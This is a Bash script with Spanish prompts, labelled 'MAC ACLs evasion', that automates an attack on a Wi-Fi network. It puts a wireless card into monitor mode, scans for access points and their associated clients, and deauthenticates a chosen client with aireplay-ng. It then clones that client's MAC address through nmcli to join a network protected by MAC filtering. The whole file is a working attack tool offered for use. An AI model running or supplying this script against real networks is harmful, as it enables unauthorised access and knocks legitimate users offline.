#!/bin/bash

white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
transparent="\e[0m"
blanco="\033[1;37m"
gris="\033[0;37m"
magenta="\033[0;35m"
rojo="\033[1;31m"
verde="\033[1;32m"
amarillo="\033[1;33m"
azul="\033[1;34m"


TOPLEFT="-geometry 67x27+0+0"
TOPRIGHT="-geometry 80x30-0+0"
BOTTOMLEFT="-geometry 105x21+0-0"
BOTTOMRIGHT="-geometry 91x19-0-0"
TOPLEFTBIG="-geometry 91x42+0+0"
TOPRIGHTBIG="-geometry 83x26-0+0"


function menu (){
	echo ""
echo -e "$verde"'       .                 .   '
echo -e "$verde"'     .´  ·  .       .  ·  `.  '
echo -e "$verde"'     :  :  : '"$blanco" ' (¯) '"$verde"'  :  :  : '
echo -e "$verde"'     `.  ·  ` '"$blanco"' /¯\ '"$verde"' ´  ·  .´ '"$Cyan"'      MAC ACLs evasion'
echo -e "$verde"'       `     '"$blanco"' /¯¯¯\ '"$verde"'    ´ '"$grey"'     Created By Mr.Robot'
echo "" 
sleep 2

}

spinner() {        
spin='/-\|'
length=${#spin}
while sleep 0.1; do
echo -ne "$grey""  Buscando redes wifi disponibles... "$verde" ${spin:i--%length:1}" "\r"
done


}

function listar_interfaces (){
	echo -e " Buscando interfaces de red....."
	sleep 2
	clear
	menu
	echo ""
	echo -e "$transparent" "interfaces de red disponibles"
	ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' | grep wlan > interfaces.txt
	 echo ""
	cat -n interfaces.txt     
	 echo ""    
	 echo -e "$purple""  ┌─""$rojo""[""$verde""Ingrese el numero de la interfaz""$rojo""]""$purple"
read -p "  └─────►""" iface_num
iface=`sed -n "$iface_num"p < interfaces.txt `
	 echo ""
	 
	 }

function modo_monitor () {
echo -e "$transparent""Añadiendo interfaz en modo monitor ...."
 airmon-ng start "$iface"  > /dev/null                                            
	sleep 0.5
	clear
	
	
}

function escaneo_de_redes(){
	spinner &
   xterm $BOTTOMRIGHT -fg "#FF4500" -T "Puntos de acceso" -e airodump-ng --output-format kismet --write captura "$iface"mon & sleep 10 ; kill $! 
  kill %1

	#modificamos el archivo de captura para almacenar los datos en bariables(eliminamos la primera linea)
	sed '1d' captura-01.kismet.csv >> dump.csv
	rm captura-01.kismet.csv
	clear
	awk -F ";" {'printf ("%30s\t%s\n",$3,  $4 "      "$6"     "$8)'} dump.csv >> datos.csv 
	echo ""
	echo ""
	echo -e "$blanco"
	echo "                                  ESSID       BSSID         Channel   SECURITY" 
	echo -e "$Cyan"
	cat -n datos.csv
	echo ""
	echo -e "$purple""  ┌─""$rojo""[""$verde""Ingrese el numero correspondiente al punto de acceso""$rojo""]""$purple"
read -p "  └─────►" num
bssid_ap=`sed -n "$num"p < dump.csv | cut -d ";" -f 4 `
channel=`sed -n "$num"p < dump.csv | cut -d ";" -f 6 `
sed -n "$num"p < dump.csv | cut -d ";" -f 3 > essid.txt 
essid=$(cat essid.txt) 
rm essid.txt
}


function clientes_asociados() {
	#spinner2 &
	echo -e "$red""   Oprima Ctrl_C para continuar "
 xterm $BOTTOMRIGHT  -T "Clientes Asociados" -e airodump-ng --bssid $bssid_ap -c $channel --output-format csv -w clientes_asociados "$iface"mon 
sed '1,5d' clientes_asociados-01.csv >> clientes.csv
awk -F "," {'printf ("%5s\t%s\n",$1,  $4 "  "$5)'} clientes.csv >> station_mac.csv && rm clientes.csv clientes_asociados-01.csv
clear
echo -e "$white" 
	echo ""
	echo "         Station MAC            Power      Frames"
	echo -e "$Cyan"
	cat -n station_mac.csv
	echo ""
	echo -e "$purple""  ┌─""$rojo""[""$verde""Ingrese el numero del cliente que quiere clonar""$rojo""]""$purple"
read -p "  └─────►" client
bssid_client=`sed -n "$client"p < station_mac.csv | cut -f 1 `
}


function deauth (){
	clear
iw dev "$iface"mon set channel $channel
xterm $TOPLEFT -fg "#FF4500" -T "Desautenticando cliente" -e aireplay-ng --ignore-negative-one -0 30 -a $bssid_ap -c $bssid_client "$iface"mon
airmon-ng stop "$iface"mon
}

	
function conect () {
echo -e "$gris"
nmcli connection delete "$essid"
nmcli con add type wifi con-name "$essid" ifname wlan0 ssid "$essid"
nmcli connection modify --temporary "$essid" 802-11-wireless.cloned-mac-address $bssid_client 
nmcli connection down "$essid" 
clear
nmcli connection up "$essid" 
}

rm interfaces.txt dump.csv datos.csv station_mac.csv > /dev/null 2>&1
menu
listar_interfaces
modo_monitor
escaneo_de_redes
clientes_asociados
deauth 
conect

 #beta
 #nmcli connection modify " + ap_objetivo_ESSID + " ipv4.addresses " + ip_cliente + "/24 ipv4.gateway " + gateway_cliente[0] + '.1' + " +ipv4.dns " + "8.8.8.8" + " ipv4.method manual connection.autoconnect false


